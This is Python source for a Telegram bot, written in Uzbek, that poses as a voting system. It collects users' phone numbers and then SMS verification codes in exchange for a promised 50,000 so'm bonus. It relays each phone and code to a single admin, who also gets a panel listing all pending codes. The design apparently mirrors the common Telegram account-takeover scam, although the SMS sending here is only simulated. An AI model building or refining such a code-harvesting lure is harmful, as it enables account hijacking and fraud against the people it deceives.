import asyncio
import random
import asyncpg
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv

# ================= LOGING =================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= KONFIG =================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))

# Render PostgreSQL ulanish
DATABASE_URL = os.getenv("DATABASE_URL")

# ================= BOT =================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Foydalanuvchi holatlari
user_states = {}
user_phones = {}
user_codes = {}
admin_states = {}

# Telefon raqam tugmasi
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True
)

# Admin tugmalari
admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📊 Statistika")],
        [KeyboardButton(text="📨 Barchaga xabar")],
        [KeyboardButton(text="📋 Kutayotgan kodlar")]
    ],
    resize_keyboard=True
)

# ================= POSTGRESQL (RENDER) =================
async def get_db():
    """Render PostgreSQL ga ulanish"""
    try:
        conn = await asyncpg.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        raise

async def init_db():
    """Jadvallarni yaratish"""
    conn = await get_db()
    try:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL,
                balance INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS sms_codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                type VARCHAR(20),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS admin_messages (
                id SERIAL PRIMARY KEY,
                admin_id BIGINT NOT NULL,
                message_text TEXT NOT NULL,
                sent_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        logger.info("✅ Database tables created successfully")
    except Exception as e:
        logger.error(f"Database init error: {e}")
        raise
    finally:
        await conn.close()

# ================= SMS YUBORISH =================
async def send_sms(phone: str, code: str):
    """SMS yuborish (simulyatsiya)"""
    logger.info(f"📨 SMS yuborildi: {phone} -> Kod: {code}")
    # Real SMS xizmat qo'shing
    return True

# ================= 1. BOSHLASH =================
@dp.message(Command("start"))
async def start(message: types.Message):
    telegram_id = message.from_user.id
    
    # Admin bo'lsa
    if telegram_id == ADMIN_ID:
        await message.answer(
            "👋 *Admin paneliga xush kelibsiz!*\n\n"
            "📊 Statistika - foydalanuvchilar soni\n"
            "📨 Barchaga xabar yuborish\n"
            "📋 Kutayotgan kodlar",
            parse_mode="Markdown",
            reply_markup=admin_menu
        )
        return
    
    # Oddiy foydalanuvchi
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        "🇺🇿 *Ovoz berish tizimi*\n\n"
        "📱 Iltimos, telefon raqamingizni yuboring:",
        reply_markup=phone_keyboard,
        parse_mode="Markdown"
    )

# ================= 2. TELEFON RAQAM =================
@dp.message(lambda msg: msg.contact is not None and msg.from_user.id != ADMIN_ID)
async def receive_phone(message: types.Message):
    phone = message.contact.phone_number
    telegram_id = message.from_user.id
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
    finally:
        await conn.close()
    
    code = str(random.randint(100000, 999999))
    user_codes[telegram_id] = code
    
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO sms_codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
    finally:
        await conn.close()
    
    await send_sms(phone, code)
    
    await message.answer(
        f"✅ *{phone}* raqamiga kod yuborildi!\n\n"
        f"📨 SMS da kelgan *6 xonali kodni* kiriting:",
        parse_mode="Markdown"
    )
    
    await bot.send_message(
        ADMIN_ID,
        f"📱 *Yangi foydalanuvchi*\n"
        f"👤 ID: `{telegram_id}`\n"
        f"📞 Telefon: `{phone}`\n"
        f"🔑 Kod: `{code}`\n"
        f"⏳ Holat: *Kod yuborildi*",
        parse_mode="Markdown"
    )

# ================= 3. KODNI QABUL QILISH =================
@dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone or len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kodni kiriting:")
        return
    
    conn = await get_db()
    try:
        existing = await conn.fetchrow(
            "SELECT * FROM sms_codes WHERE phone = $1 AND code = $2 AND status = 'pending'",
            phone, code
        )
        
        if existing:
            await message.answer(
                "⏳ *Kod qabul qilindi!*\n\n"
                "Admin tomonidan tekshirilmoqda...",
                parse_mode="Markdown"
            )
            
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="✅ Tasdiqlash (+50 000 so'm)",
                            callback_data=f"verify_{telegram_id}_{phone}_{code}"
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text="❌ Rad etish",
                            callback_data=f"reject_{telegram_id}"
                        )
                    ]
                ]
            )
            
            await bot.send_message(
                ADMIN_ID,
                f"🔑 *Kod kelib tushdi!*\n\n"
                f"👤 Foydalanuvchi ID: `{telegram_id}`\n"
                f"📞 Telefon: `{phone}`\n"
                f"🔢 Kod: `{code}`\n\n"
                f"✅ Kodni tasdiqlang yoki rad eting:",
                parse_mode="Markdown",
                reply_markup=keyboard
            )
            
            user_states[telegram_id] = "verified"
        else:
            await message.answer(
                "❌ *Noto'g'ri kod!*\n\n"
                "Qaytadan urinib ko'ring.",
                parse_mode="Markdown"
            )
    finally:
        await conn.close()

# ================= 4. ADMIN TASDIQLASH =================
@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        conn = await get_db()
        try:
            result = await conn.execute(
                "UPDATE sms_codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            if result == "UPDATE 1":
                await conn.execute(
                    "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                    telegram_id
                )
                
                await conn.execute(
                    "INSERT INTO transactions (telegram_id, amount, type) "
                    "VALUES ($1, 50000, 'bonus')",
                    telegram_id
                )
                
                await bot.send_message(
                    telegram_id,
                    "✅ *Tasdiqlandi!* 🎉\n\n"
                    "💰 Hisobingizga *50 000 so'm* qo'shildi!\n\n"
                    "Rahmat! ✅",
                    parse_mode="Markdown"
                )
                
                await callback.message.edit_text(
                    f"✅ *Foydalanuvchi tasdiqlandi!*\n"
                    f"👤 ID: `{telegram_id}`\n"
                    f"📞 Telefon: `{phone}`\n"
                    f"💰 +50 000 so'm",
                    parse_mode="Markdown"
                )
                await callback.answer("✅ Tasdiqlandi!")
        finally:
            await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = await get_db()
        try:
            await conn.execute(
                "UPDATE sms_codes SET status = 'expired' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            await bot.send_message(
                telegram_id,
                "❌ *Kod rad etildi!*\n\n"
                "Iltimos, qaytadan urinib ko'ring.",
                parse_mode="Markdown"
            )
            
            await callback.message.edit_text(
                f"❌ *Foydalanuvchi rad etildi!*\n"
                f"👤 ID: `{telegram_id}`",
                parse_mode="Markdown"
            )
            await callback.answer("❌ Rad etildi")
        finally:
            await conn.close()

# ================= 5. ADMIN MENU =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    conn = await get_db()
    try:
        users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
        total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        today = await conn.fetchval(
            "SELECT COUNT(*) FROM users WHERE DATE(created_at) = CURRENT_DATE"
        )
        pending = await conn.fetchval(
            "SELECT COUNT(*) FROM sms_codes WHERE status = 'pending'"
        )
        verified = await conn.fetchval(
            "SELECT COUNT(*) FROM sms_codes WHERE status = 'verified'"
        )
        
        await message.answer(
            f"📊 *Statistika*\n\n"
            f"👥 Foydalanuvchilar: *{users_count}*\n"
            f"💰 Jami balans: *{total_balance:,} so'm*\n"
            f"📅 Bugun: *{today}*\n\n"
            f"⏳ Kutayotgan: *{pending}*\n"
            f"✅ Tasdiqlangan: *{verified}*",
            parse_mode="Markdown"
        )
    finally:
        await conn.close()

# ================= 6. KUTAYOTGAN KODLAR =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    conn = await get_db()
    try:
        codes = await conn.fetch(
            "SELECT * FROM sms_codes WHERE status = 'pending' ORDER BY created_at DESC LIMIT 20"
        )
        
        if codes:
            text = "📋 *Kutayotgan kodlar:*\n\n"
            for c in codes:
                text += f"👤 ID: `{c['telegram_id']}`\n"
                text += f"📞 Telefon: `{c['phone']}`\n"
                text += f"🔑 Kod: `{c['code']}`\n"
                text += f"⏰ {c['created_at']}\n"
                text += "-" * 20 + "\n"
            
            await message.answer(text, parse_mode="Markdown")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
    finally:
        await conn.close()

# ================= 7. BARCHAGA XABAR =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
async def send_all_start(message: types.Message):
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer(
        "📨 *Barchaga xabar yuborish*\n\n"
        "Xabar matnini yozing:\n"
        "(Bekor qilish /cancel)",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def send_all_message(message: types.Message):
    if message.text == "/cancel":
        admin_states.pop(ADMIN_ID, None)
        await message.answer("❌ Bekor qilindi!", reply_markup=admin_menu)
        return
    
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    conn = await get_db()
    try:
        users = await conn.fetch("SELECT telegram_id FROM users")
        
        if not users:
            await message.answer("❌ Foydalanuvchilar yo'q!")
            return
        
        await conn.execute(
            "INSERT INTO admin_messages (admin_id, message_text) VALUES ($1, $2)",
            ADMIN_ID, text
        )
        
        sent = 0
        failed = 0
        
        await message.answer(f"⏳ Xabar {len(users)} ta foydalanuvchiga yuborilmoqda...")
        
        for user in users:
            try:
                await bot.send_message(
                    user['telegram_id'],
                    f"📨 *Admin xabari*\n\n{text}",
                    parse_mode="Markdown"
                )
                sent += 1
                await asyncio.sleep(0.05)
            except:
                failed += 1
        
        await conn.execute(
            "UPDATE admin_messages SET sent_count = $1 WHERE id = (SELECT MAX(id) FROM admin_messages)",
            sent
        )
        
        await message.answer(
            f"✅ *Xabar yuborildi!*\n\n"
            f"✅ Yuborildi: *{sent}*\n"
            f"❌ Yuborilmadi: *{failed}*",
            parse_mode="Markdown",
            reply_markup=admin_menu
        )
    finally:
        await conn.close()

# ================= 8. BALANS =================
@dp.message(Command("balance"))
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Admin panelda /start bosing")
        return
    
    conn = await get_db()
    try:
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        
        if user:
            await message.answer(
                f"💰 Balans: *{user['balance']:,} so'm*",
                parse_mode="Markdown"
            )
        else:
            await message.answer("❌ Ro'yxatdan o'tmagan. /start")
    finally:
        await conn.close()

# ================= 9. CANCEL =================
@dp.message(Command("cancel"))
async def cancel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        admin_states.pop(ADMIN_ID, None)
        await message.answer("❌ Bekor qilindi!", reply_markup=admin_menu)

# ================= 10. MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    
    # Ma'lumotlar bazasini tayyorlash
    await init_db()
    
    # Botni ishga tushirish
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
